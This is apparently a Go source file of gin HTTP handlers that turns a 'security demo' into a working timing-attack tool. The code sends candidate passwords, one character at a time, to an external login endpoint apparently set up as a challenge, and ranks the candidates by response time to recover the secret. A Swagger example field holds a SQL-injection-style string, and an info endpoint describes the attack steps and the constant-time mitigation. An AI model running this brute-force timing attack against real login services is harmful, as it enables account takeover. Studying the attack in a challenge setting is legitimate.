package handlers

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// SecurityHandler handles security-related demonstration endpoints
type SecurityHandler struct{}

// NewSecurityHandler creates a new instance of SecurityHandler
func NewSecurityHandler() *SecurityHandler {
	return &SecurityHandler{}
}

// TimingAttackRequest represents the timing attack request payload
type TimingAttackRequest struct {
	Username string `json:"username" binding:"required" example:"davidalbertoguz@gmail.com"`
	Password string `json:"password" binding:"required" example:"password/**/FROM/**/users--"`
}

// ExternalLoginRequest represents the request to external API
type ExternalLoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// TimingAttackResponse represents the timing attack response
type TimingAttackResponse struct {
	Success      bool          `json:"success" example:"false"`
	Message      string        `json:"message" example:"Login attempt completed"`
	ResponseTime time.Duration `json:"response_time_ms" example:"150"`
	StatusCode   int           `json:"status_code" example:"401"`
	ExternalResp string        `json:"external_response,omitempty"`
}

// TimingAttackLogin performs timing attack against external API
// @Summary Timing Attack Against External API
// @Description Performs a timing attack by making requests to https://api.karenai.click/swechallenge/login and measuring response times. This is for educational purposes only.
// @Tags security-demo
// @Accept json
// @Produce json
// @Param request body TimingAttackRequest true "Login credentials for timing attack"
// @Success 200 {object} TimingAttackResponse "Timing attack attempt completed"
// @Failure 400 {object} map[string]string "Bad request - invalid JSON or missing fields"
// @Router /security/timing-attack-login [post]
func (h *SecurityHandler) TimingAttackLogin(c *gin.Context) {
	var req TimingAttackRequest

	// Parse and validate request body
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Invalid request format. Username and password fields are required.",
		})
		return
	}

	// Perform timing attack against external API
	response := h.performTimingAttack(req.Username, req.Password)

	c.JSON(http.StatusOK, response)
}

// performTimingAttack executes a timing attack against the external API
func (h *SecurityHandler) performTimingAttack(username, password string) TimingAttackResponse {
	// Prepare request payload for external API
	externalReq := ExternalLoginRequest{
		Username: username,
		Password: password,
	}

	// Convert to JSON
	jsonData, err := json.Marshal(externalReq)
	if err != nil {
		return TimingAttackResponse{
			Success:      false,
			Message:      "Failed to marshal request",
			ResponseTime: 0,
			StatusCode:   0,
		}
	}

	// Record start time for timing measurement
	startTime := time.Now()

	// Make POST request to external API
	resp, err := http.Post(
		"https://api.karenai.click/swechallenge/login",
		"application/json",
		bytes.NewBuffer(jsonData),
	)

	// Calculate response time
	responseTime := time.Since(startTime)

	if err != nil {
		return TimingAttackResponse{
			Success:      false,
			Message:      fmt.Sprintf("Request failed: %v", err),
			ResponseTime: responseTime,
			StatusCode:   0,
		}
	}
	defer resp.Body.Close()

	// Read response body
	var responseBody bytes.Buffer
	responseBody.ReadFrom(resp.Body)

	// Determine success based on status code
	success := resp.StatusCode == http.StatusOK

	return TimingAttackResponse{
		Success:      success,
		Message:      "Timing attack completed",
		ResponseTime: responseTime,
		StatusCode:   resp.StatusCode,
		ExternalResp: responseBody.String(),
	}
}

// PasswordOnlyRequest represents request with only password field
type PasswordOnlyRequest struct {
	Password string `json:"password" binding:"required" example:"intento_de_contraseña"`
}

// BulkTimingAttack performs character-by-character timing attack exploitation
// @Summary Character-by-Character Timing Attack
// @Description Exploits timing attack vulnerability by testing individual characters and combinations, measuring response times to discover password character by character
// @Tags security-demo
// @Accept json
// @Produce json
// @Param request body PasswordOnlyRequest true "Base password for character-by-character timing attack"
// @Success 200 {object} map[string]interface{} "Character-by-character timing attack results"
// @Failure 400 {object} map[string]string "Bad request"
// @Router /security/bulk-timing-attack [post]
func (h *SecurityHandler) BulkTimingAttack(c *gin.Context) {
	var req PasswordOnlyRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	// Remove all whitespaces from password
	cleanPassword := strings.ReplaceAll(req.Password, " ", "")
	fmt.Printf("Received BulkTimingAttack request: %+v (cleaned: %+v)\n", req.Password, cleanPassword)

	// Perform character-by-character timing attack
	results := h.performCharacterTimingAttack(cleanPassword)

	c.JSON(http.StatusOK, gin.H{
		"message":             "Character-by-character timing attack completed",
		"original_password":   req.Password,
		"base_password":       cleanPassword,
		"total_attempts":      len(results["character_results"].([]map[string]interface{})),
		"character_results":   results["character_results"],
		"timing_analysis":     results["timing_analysis"],
		"discovered_patterns": results["discovered_patterns"],
		"exploitation_method": "Character-by-character timing analysis with uppercase, lowercase, and numbers",
	})
}

// ServerTimingResponse represents the server's timing response
type ServerTimingResponse struct {
	Duration int64  `json:"duration"`
	Message  string `json:"message"`
}

// performPasswordOnlyTimingAttack executes timing attack with password-only payload
func (h *SecurityHandler) performPasswordOnlyTimingAttack(password string) map[string]interface{} {
	// Prepare request payload with only password field
	payload := map[string]string{
		"password": password,
	}

	// Convert to JSON
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return map[string]interface{}{
			"password":         password,
			"success":          false,
			"error":            "Failed to marshal request",
			"response_time_ms": 0,
			"server_duration":  0,
		}
	}

	// Record start time for precise timing measurement
	startTime := time.Now()

	// Make POST request to external API with timing parameters
	resp, err := http.Post(
		"https://api.karenai.click/swechallenge/login?timing=true&level=easy",
		"application/json",
		bytes.NewBuffer(jsonData),
	)

	// Calculate client-side response time
	responseTime := time.Since(startTime)

	if err != nil {
		return map[string]interface{}{
			"password":         password,
			"success":          false,
			"error":            fmt.Sprintf("Request failed: %v", err),
			"response_time_ms": responseTime.Milliseconds(),
			"server_duration":  0,
		}
	}
	defer resp.Body.Close()

	// Read and parse response body
	var responseBody bytes.Buffer
	responseBody.ReadFrom(resp.Body)
	responseStr := responseBody.String()

	// Parse server timing response
	var serverTiming ServerTimingResponse
	serverDuration := int64(0)
	if json.Unmarshal([]byte(responseStr), &serverTiming) == nil {
		serverDuration = serverTiming.Duration
	}

	return map[string]interface{}{
		"password":         password,
		"success":          resp.StatusCode == http.StatusOK,
		"status_code":      resp.StatusCode,
		"response_time_ms": responseTime.Milliseconds(),
		"server_duration":  serverDuration,
		"response_body":    responseStr,
		"server_message":   serverTiming.Message,
	}
}

// performCharacterTimingAttack performs timing attack on base password + all charset characters
func (h *SecurityHandler) performCharacterTimingAttack(basePassword string) map[string]interface{} {
	// Character sets: uppercase, lowercase, numbers
	charset := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	var allResults []map[string]interface{}
	var discoveredPatterns []string

	// If password is empty, test all single characters
	if basePassword == "" {
		discoveredPatterns = append(discoveredPatterns, "Empty password - testing all single characters")
		for _, char := range charset {
			result := h.performPasswordOnlyTimingAttack(string(char))
			allResults = append(allResults, result)
			discoveredPatterns = append(discoveredPatterns, 
				fmt.Sprintf("Testing '%s' -> %dms (server: %dms)", 
					string(char), result["response_time_ms"], result["server_duration"]))
			time.Sleep(20 * time.Millisecond)
		}
	} else {
		// Test base password first
		baseResult := h.performPasswordOnlyTimingAttack(basePassword)
		allResults = append(allResults, baseResult)
		discoveredPatterns = append(discoveredPatterns, 
			fmt.Sprintf("Testing '%s' -> %dms (server: %dms)", 
				basePassword, baseResult["response_time_ms"], baseResult["server_duration"]))

		// Test base password + each character
		for _, char := range charset {
			testPassword := basePassword + string(char)
			result := h.performPasswordOnlyTimingAttack(testPassword)
			allResults = append(allResults, result)
			discoveredPatterns = append(discoveredPatterns, 
				fmt.Sprintf("Testing '%s' -> %dms (server: %dms)", 
					testPassword, result["response_time_ms"], result["server_duration"]))
			time.Sleep(20 * time.Millisecond)
		}
	}

	// Find all passwords with maximum server duration
	maxServerDuration := int64(0)
	var bestPasswords []string
	
	// First pass: find maximum server duration
	for _, result := range allResults {
		if serverDur, ok := result["server_duration"].(int64); ok && serverDur > maxServerDuration {
			maxServerDuration = serverDur
		}
	}
	
	// Second pass: collect all passwords with maximum duration
	for _, result := range allResults {
		if serverDur, ok := result["server_duration"].(int64); ok && serverDur == maxServerDuration {
			bestPasswords = append(bestPasswords, result["password"].(string))
		}
	}

	if len(bestPasswords) > 0 {
		if len(bestPasswords) == 1 {
			discoveredPatterns = append(discoveredPatterns,
				fmt.Sprintf("Best password by server duration: '%s' (server duration: %dms)",
					bestPasswords[0], maxServerDuration))
		} else {
			discoveredPatterns = append(discoveredPatterns,
				fmt.Sprintf("Best passwords by server duration (%d found): %v (server duration: %dms)",
					len(bestPasswords), bestPasswords, maxServerDuration))
		}
	}

	bestPassword := ""
	if len(bestPasswords) > 0 {
		bestPassword = bestPasswords[0]
	}

	return map[string]interface{}{
		"character_results":     allResults,
		"timing_analysis":       h.analyzeCharacterTimings(allResults),
		"discovered_patterns":   discoveredPatterns,
		"best_password":         bestPassword,
		"best_passwords":        bestPasswords,
		"best_server_duration":  maxServerDuration,
		"base_password":         basePassword,
		"attack_method":         "Base password + character variations",
	}
}

// analyzeCharacterTimings analyzes character-based timing patterns
func (h *SecurityHandler) analyzeCharacterTimings(results []map[string]interface{}) map[string]interface{} {
	if len(results) == 0 {
		return map[string]interface{}{"error": "No results to analyze"}
	}

	var totalTime int64
	var minTime, maxTime int64
	var slowestPasswords []string
	var fastestPasswords []string
	successCount := 0

	// Initialize with first result
	firstTime := results[0]["response_time_ms"].(int64)
	minTime = firstTime
	maxTime = firstTime

	for _, result := range results {
		responseTime := result["response_time_ms"].(int64)
		password := result["password"].(string)
		totalTime += responseTime

		if responseTime < minTime {
			minTime = responseTime
			fastestPasswords = []string{password}
		} else if responseTime == minTime {
			fastestPasswords = append(fastestPasswords, password)
		}

		if responseTime > maxTime {
			maxTime = responseTime
			slowestPasswords = []string{password}
		} else if responseTime == maxTime {
			slowestPasswords = append(slowestPasswords, password)
		}

		if result["success"].(bool) {
			successCount++
		}
	}

	avgTime := totalTime / int64(len(results))
	timingVariance := maxTime - minTime

	return map[string]interface{}{
		"average_response_time_ms": avgTime,
		"min_response_time_ms":     minTime,
		"max_response_time_ms":     maxTime,
		"timing_variance_ms":       timingVariance,
		"fastest_passwords":        fastestPasswords,
		"slowest_passwords":        slowestPasswords,
		"successful_attempts":      successCount,
		"total_attempts":           len(results),
		"timing_attack_feasible":   timingVariance > 5,
		"exploitation_potential":   timingVariance > 20,
		"character_analysis":       "Passwords with longer response times may indicate partial matches",
	}
}

// GetTimingAttackInfo provides information about timing attacks
// @Summary Timing Attack Information
// @Description Provides educational information about timing attacks and how they work
// @Tags security-demo
// @Produce json
// @Success 200 {object} map[string]interface{} "Timing attack information"
// @Router /security/timing-attack-info [get]
func (h *SecurityHandler) GetTimingAttackInfo(c *gin.Context) {
	info := gin.H{
		"attack_type":   "Timing Attack",
		"description":   "A timing attack is a side-channel attack where an attacker attempts to compromise a system by analyzing the time taken to execute cryptographic algorithms or password comparisons.",
		"vulnerability": "The vulnerable endpoint compares passwords character by character and returns immediately upon finding a mismatch, creating measurable timing differences.",
		"exploitation":  "An attacker can measure response times to determine correct password characters one by one.",
		"mitigation":    "Use constant-time comparison functions like crypto/subtle.ConstantTimeCompare to ensure all comparisons take the same amount of time regardless of input.",
		"endpoints": gin.H{
			"vulnerable": "/api/security/timing-attack-login",
			"secure":     "/api/security/secure-login",
		},
		"test_password": "super_secret_password_2024",
		"example_attack": gin.H{
			"step1": "Try passwords starting with 'a', 'b', 'c'... and measure response times",
			"step2": "The password starting with 's' will take slightly longer (correct first character)",
			"step3": "Continue with 'sa', 'sb', 'sc'... until 'su' takes longer",
			"step4": "Repeat this process to discover the full password character by character",
		},
	}

	c.JSON(http.StatusOK, info)
}
